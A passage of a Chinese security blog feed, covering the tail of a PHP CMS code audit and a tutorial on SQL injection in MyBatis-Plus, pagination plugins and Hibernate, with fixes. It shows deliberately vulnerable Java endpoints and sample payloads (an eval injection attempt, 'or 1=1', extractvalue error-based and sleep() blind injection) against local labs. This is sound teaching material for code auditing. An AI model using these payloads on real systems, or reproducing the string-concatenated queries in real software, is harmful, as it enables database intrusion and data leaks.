class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此代码大致作用：</p><ol><li>获取请求参数 <code>a</code> 来确定控制器；</li><li>若请求的是后台控制器，且用户未登录，则重定向到登录页面；</li><li>若控制器类文件不存在，则默认使用 <code>LoginAction</code>；</li><li>创建控制器类的对象，并返回</li></ol><p>所以无法调用传入的控制器内不存在的方法</p><p>存在eval函数的方法是run方法，像另一个成功执行的rce漏洞一样构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/yccms/admin/?a=action&amp;m=run();phpinfo();//../#<br></code></pre></td></tr></table></figure><p>仍然无法注入成功</p><p>可以看到在步入run.inc.php后，m的值变为main</p><h5 id="文件包含-run-inc-php-误报"><a href="#文件包含-run-inc-php-误报" class="headerlink" title="文件包含(run.inc.php)误报"></a>文件包含(run.inc.php)误报</h5><p>工具审计时发现了require关键字，可能存在文件包含漏洞</p><p>但是require函数内无可控变量，无法利用此函数</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol><li><p>自动化工具一般是直接搜索关键字或敏感函数，误报很多</p></li><li><p>找漏洞关键要看漏洞点和利用点，有入口能利用才算漏洞</p></li><li><p>寻找敏感函数和可控变量，查看变量有无过滤，过滤是否可绕过</p></li><li><p>cms漏洞：</p><ul><li>鉴权处理不到位，大部分操作都没有鉴权，无需登录就可操作</li></ul><p>​       修复建议：写出单独的鉴权文件，在每个类中引用</p><ul><li>过滤不严格，对文件名及文件路径几乎无过滤</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CMS</tag>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的sql注入2.0</title>
    <link href="/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/"/>
    <url>/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/</url>
    
    <content type="html"><![CDATA[<h1 id="Java代码审计中的sql注入2-0"><a href="#Java代码审计中的sql注入2-0" class="headerlink" title="Java代码审计中的sql注入2.0"></a>Java代码审计中的sql注入2.0</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.top/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E6%80%BB%E7%BB%93-JDBC-%E6%98%93%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%82%B9">Java OWASP 中的 SQL 注入代码审计 | Drunkbaby’s Blog (drun1baby.top)</a></p><p><a href="https://xz.aliyun.com/news/11118">JAVA常用框架SQL注入审计-先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_38170796/article/details/135398819">预编译真的能完美防御SQL注入吗？_预编译能完全防止sql注入吗-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_63299495/article/details/145633163">【MyBatis】预编译SQL与即时SQL_mybatis sql预处理-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_45537947/article/details/111399311">MyBatis-Plus快速入门-(干货满满+超详细)_mybatis-plus 入门-CSDN博客</a></p><h2 id="Mybatis-Plus-的-SQL-注入探讨"><a href="#Mybatis-Plus-的-SQL-注入探讨" class="headerlink" title="Mybatis-Plus 的 SQL 注入探讨"></a>Mybatis-Plus 的 SQL 注入探讨</h2><h3 id="使用apply直接拼接sql语句"><a href="#使用apply直接拼接sql语句" class="headerlink" title="使用apply直接拼接sql语句"></a>使用apply直接拼接sql语句</h3><h4 id="实际的apply场景"><a href="#实际的apply场景" class="headerlink" title="实际的apply场景"></a>实际的apply场景</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 将此方法绑定到 HTTP 请求路径 /mybatis_plus/mpVuln01</span><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln01&quot;)</span>  <br><span class="hljs-comment">// 定义一个控制器方法，接收两个参数 name 和 id，并返回一个 Employee 对象</span><br><span class="hljs-keyword">public</span> Employee <span class="hljs-title function_">mpVuln01</span><span class="hljs-params">(String name, String id)</span> &#123;  <br>    <span class="hljs-comment">// 创建一个查询条件构造器</span><br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br>    <span class="hljs-comment">// 添加等值查询条件：WHERE name = #&#123;name&#125;</span><br>    wrapper.eq(<span class="hljs-string">&quot;name&quot;</span>, name);  <br>    <span class="hljs-comment">// 直接拼接 SQL 片段，变成：AND id=xxx（存在 SQL 注入风险）</span><br>    wrapper.apply(<span class="hljs-string">&quot;id=&quot;</span> + id);  <br>    <span class="hljs-comment">// 执行查询，只返回一条符合条件的记录</span><br>    <span class="hljs-type">Employee</span> <span class="hljs-variable">employee</span> <span class="hljs-operator">=</span> employeeMapper.selectOne(wrapper);  <br>    <span class="hljs-comment">// 返回查询结果</span><br>    <span class="hljs-keyword">return</span> employee;  <br>&#125;<br></code></pre></td></tr></table></figure><p>可以直接看到这里的参数传入是直接拼接的，存在sql注入漏洞</p><p>但是由于selectOne函数的存在(只返回一条符合条件的记录)，这里只能进行报错注入，万能密码会返回全部数据，由于特殊函数限制，无法注入成功</p><h4 id="apply场景的防护"><a href="#apply场景的防护" class="headerlink" title="apply场景的防护"></a>apply场景的防护</h4><p>在语句后加上参数占位符{0}即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpSec02&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpSec02</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.apply(<span class="hljs-string">&quot;id=&#123;0&#125;&quot;</span>,id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="last方法产生的sql注入"><a href="#last方法产生的sql注入" class="headerlink" title="last方法产生的sql注入"></a>last方法产生的sql注入</h3><p>last()方法重写后有两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">last(String lastSql)<br>last(<span class="hljs-type">boolean</span> condition, String lastSql)<br></code></pre></td></tr></table></figure><p>此方法中lastSql可以直接用来编写SQL语句，写一个新接口</p><p>猜测实战黑盒利用场景为在线sql语句执行程序，可以编写新接口进行渗透</p><p>这里直接使用Drunkbaby师傅的漏洞环境</p><p>项目地址：[JavaSecurityLearning&#x2F;JavaSecurity&#x2F;Java 代码审计&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;MybatisPluSqli at main · Drun1baby&#x2F;JavaSecurityLearning (github.com)](<a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java</a> 代码审计&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;MybatisPluSqli)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/last&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln03</span><span class="hljs-params">( String id)</span> &#123;<br>        QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();<br>        wrapper.last(<span class="hljs-string">&quot;order by &quot;</span> + id);<br>        <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);<br>    &#125;<br></code></pre></td></tr></table></figure><p>启动环境时出现报错</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A501.png" alt="图片"></p><p>在MybatisPluSqliApplication.java文件加上一行代码即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MapperScan(&quot;com.drunkbaby.mapper&quot;)</span><br></code></pre></td></tr></table></figure><p>文件全部</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.drunkbaby;<br><br><span class="hljs-keyword">import</span> org.mybatis.spring.annotation.MapperScan;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-meta">@MapperScan(&quot;com.drunkbaby.mapper&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPluSqliApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MybatisPluSqliApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>实操后发现不需要payload也是直接爆出所有数据的</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A502.png" alt="图片"></p><p>可能是我的操作出了什么问题，但是本来控制代码就不是很多，感觉应该是没有问题的</p><p>正常payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8081/mybatis_plus/last?id=1%20or%201=1<br></code></pre></td></tr></table></figure><h4 id="order-by相关的sql注入"><a href="#order-by相关的sql注入" class="headerlink" title="order by相关的sql注入"></a>order by相关的sql注入</h4><p>刚开始想要搭这个环境的主要原因是没见过order by后拼接万能密码的</p><p>再次复习了一下order by相关</p><p>在 SQL 中，<code>ORDER BY</code> 子句用于对查询结果进行排序。<code>ORDER BY</code> 后的参数有以下要求和注意事项：</p><ol><li>列名或别名</li></ol><ul><li><p>可以使用表中的列名或查询中定义的列别名。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age;<br></code></pre></td></tr></table></figure></li></ul><ol start="2"><li>列的序号(sql注入中常用于判断列数)</li></ol><ul><li><p>可以使用 SELECT 子句中列的序号（从 1 开始）。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">2</span>; <span class="hljs-comment">-- 按第二列 age 排序</span><br></code></pre></td></tr></table></figure></li></ul><ol start="3"><li>排序方式</li></ol><ul><li><p>默认是升序（<code>ASC</code>），也可以显式指定。</p></li><li><p>降序使用 <code>DESC</code>。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><p> 4.多个排序条件</p></li><li><p>可以指定多个列，按优先级依次排序。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age, grade <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade <span class="hljs-keyword">DESC</span>, age <span class="hljs-keyword">ASC</span>;<br></code></pre></td></tr></table></figure></li></ul><ol start="5"><li>表达式或计算结果</li></ol><ul><li><p>可以使用表达式或计算结果进行排序。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, salary, bonus <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (salary <span class="hljs-operator">+</span> bonus) <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure></li></ul><ol start="6"><li>NULL 值排序</li></ol><ul><li><p>不同数据库对 </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p> 的排序处理可能不同：</p><ul><li>一般情况下，<code>NULL</code> 在升序中排在最前，在降序中排在最后。</li><li>可以使用 <code>NULLS FIRST</code> 或 <code>NULLS LAST</code> 明确指定。</li></ul></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">ASC</span> <span class="hljs-keyword">NULLS LAST</span>;<br></code></pre></td></tr></table></figure></li></ul><p>注意事项：</p><ul><li>列必须存在：<code>ORDER BY</code> 中引用的列或别名必须在查询结果中有效。</li><li>性能影响：排序操作可能会影响查询性能，尤其是大数据集时。</li></ul><p>并且order by语句后无法拼接变量，但是可以拼接sql语句，如果万能密码能够使用，猜测是被当作sql语句执行</p><h3 id="exists-notExists-拼接产生的SQL-注入"><a href="#exists-notExists-拼接产生的SQL-注入" class="headerlink" title="exists&#x2F;notExists 拼接产生的SQL 注入"></a>exists&#x2F;notExists 拼接产生的SQL 注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln04&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln04</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.exists(<span class="hljs-string">&quot;select * from employees where id = &quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="having-语句"><a href="#having-语句" class="headerlink" title="having 语句"></a>having 语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln06&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln06</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().groupBy(<span class="hljs-string">&quot;id&quot;</span>).having(<span class="hljs-string">&quot;id &gt;&quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="order-by-语句-写order-by-的时候不能预编译，下面有一个模块详细讲解"><a href="#order-by-语句-写order-by-的时候不能预编译，下面有一个模块详细讲解" class="headerlink" title="order by 语句(写order by 的时候不能预编译，下面有一个模块详细讲解)"></a>order by 语句(写order by 的时候不能预编译，下面有一个模块详细讲解)</h3><p>相关接口写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby01</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderBy(<span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/orderby02&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby02</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderByAsc(id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/orderby03&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby03</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderByDesc(id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="group-By-order-by"><a href="#group-By-order-by" class="headerlink" title="group By&#x2F;order by"></a>group By&#x2F;order by</h3><h3 id="inSql-notInSql"><a href="#inSql-notInSql" class="headerlink" title="inSql&#x2F;notInSql"></a>inSql&#x2F;notInSql</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/insql&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">inSql</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().inSql(id, <span class="hljs-string">&quot;select * from employees where id &gt;&quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><p>这几种方法都是不支持预编译绑定参数，会直接将字符串拼接到最终 SQL 末尾**，**不会做任何参数绑定或转义处理。导致攻击者传入恶意代码造成语句拼接，用户信息泄露。</p><h3 id="分页插件的-SQL-注入情况"><a href="#分页插件的-SQL-注入情况" class="headerlink" title="分页插件的 SQL 注入情况"></a>分页插件的 SQL 注入情况</h3><h4 id="分页插件自带的-addOrder-方法"><a href="#分页插件自带的-addOrder-方法" class="headerlink" title="分页插件自带的 addOrder() 方法"></a>分页插件自带的 <code>addOrder()</code> 方法</h4><ul><li><p>配置分页插件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.drunkbaby.config;  <br>  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.annotation.DbType;  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;  <br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;  <br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;  <br>  <br><span class="hljs-meta">@Configuration</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> &#123;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * 注册插件  </span><br><span class="hljs-comment"> */</span>  <br> <span class="hljs-meta">@Bean</span>  <br> <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> &#123;  <br>  <br>        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();  <br> <span class="hljs-comment">// 添加分页插件  </span><br> <span class="hljs-type">PaginationInnerInterceptor</span> <span class="hljs-variable">pageInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>();  <br> <span class="hljs-comment">// 设置请求的页面大于最大页后操作，true调回到首页，false继续请求。默认false  </span><br> pageInterceptor.setOverflow(<span class="hljs-literal">false</span>);  <br> <span class="hljs-comment">// 单页分页条数限制，默认无限制  </span><br> pageInterceptor.setMaxLimit(<span class="hljs-number">500L</span>);  <br> <span class="hljs-comment">// 设置数据库类型  </span><br> pageInterceptor.setDbType(DbType.MYSQL);  <br>  <br> interceptor.addInnerInterceptor(pageInterceptor);  <br> <span class="hljs-keyword">return</span> interceptor;  <br> &#125;    <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>漏洞接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/PageVul01&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title function_">mybatisPlusPageVuln01</span><span class="hljs-params">(Long page, Long size, String id)</span>&#123;  <br>    QueryWrapper&lt;Person&gt; queryWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> Page&lt;Person&gt; personPage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);  <br> personPage.addOrder(OrderItem.asc(id));  <br> IPage&lt;Person&gt; iPage= personMapper.selectPage(personPage, queryWrapper);  <br> List&lt;Person&gt; people = iPage.getRecords();  <br> <span class="hljs-keyword">return</span> people;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>Page&lt;Person&gt; personPage = new Page&lt;&gt;(1,2);</code> 的参数由自己定义</p><p>这里对应的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e)))<br><br>// 或者是<br>?id=1&#x27; and sleep(5)<br></code></pre></td></tr></table></figure><p>必须是通过盲注的形式，如果是普通的注入，是不会有回显的；因为这里分页查找，size 就把你的数据数量限定死了，如果超过这个数据就会报错，所以只能盲注。</p></li></ul><h4 id="pagehelper"><a href="#pagehelper" class="headerlink" title="pagehelper"></a>pagehelper</h4><p>这里的原理就和 order by 一样，不赘述了</p><p>因为Order by排序时不能进行预编译处理，所以在使用插件时需要额外注意如下function，同样会存在SQL注入风险：</p><ul><li>com.github.pagehelper.Page<ul><li>主要是setOrderBy(java.lang.String)方法</li></ul></li><li>com.github.pagehelper.page.PageMethod<ul><li>主要是startPage(int,int,java.lang.String)方法</li></ul></li><li>com.github.pagehelper.PageHelper<ul><li>主要是startPage(int,int,java.lang.String)方法</li></ul></li></ul><h2 id="mybatis-Plus-SQL-注入的修复"><a href="#mybatis-Plus-SQL-注入的修复" class="headerlink" title="mybatis Plus SQL 注入的修复"></a>mybatis Plus SQL 注入的修复</h2><p>以上列出的所有方法，除了apply方法可以使用参数占位符进行防护，其他方法全部不支持预编译绑定参数，会直接将字符串拼接到最终 SQL 末尾**，**不会做任何参数绑定或转义处理。导致攻击者传入恶意代码造成语句拼接，用户信息泄露。</p><p>能想到的防护方法只有对传入的参数进行检测和过滤</p><p>还有写Filter进行过滤</p><p>过滤器集成：<a href="https://github.com/Drun1baby/AWD-AWDP_SecFilters">Drun1baby&#x2F;AWD-AWDP_SecFilters: 为了准备 AWD，写了个 Filter 的集合 (github.com)</a></p><h2 id="Hibernate框架下的SQL注入"><a href="#Hibernate框架下的SQL注入" class="headerlink" title="Hibernate框架下的SQL注入"></a>Hibernate框架下的SQL注入</h2><p> Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。</p><p>一般是默认进行预编译的</p><p>Hibernate可以使用hql来执行SQL语句，也可以直接执行SQL语句，无论是哪种方式都有可能导致SQL注入</p><h3 id="HQL"><a href="#HQL" class="headerlink" title="HQL"></a>HQL</h3><p>hql语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hql">String hql = &quot;from People where username = &#x27;&quot; + username + &quot;&#x27; and password = &#x27;&quot; + password + &quot;&#x27;&quot;;<br></code></pre></td></tr></table></figure><p>这种拼接方式存在SQL注入</p><p>正确使用以下几种HQL参数绑定的方式可以有效避免注入的产生：</p><p>1.命名参数（named parameter）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = :name&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>, parameter);<br></code></pre></td></tr></table></figure><p>2.位置参数（Positional parameter）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-number">1</span>, parameter);<br></code></pre></td></tr></table></figure><p>3.命名参数列表（named parameter list）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; names = 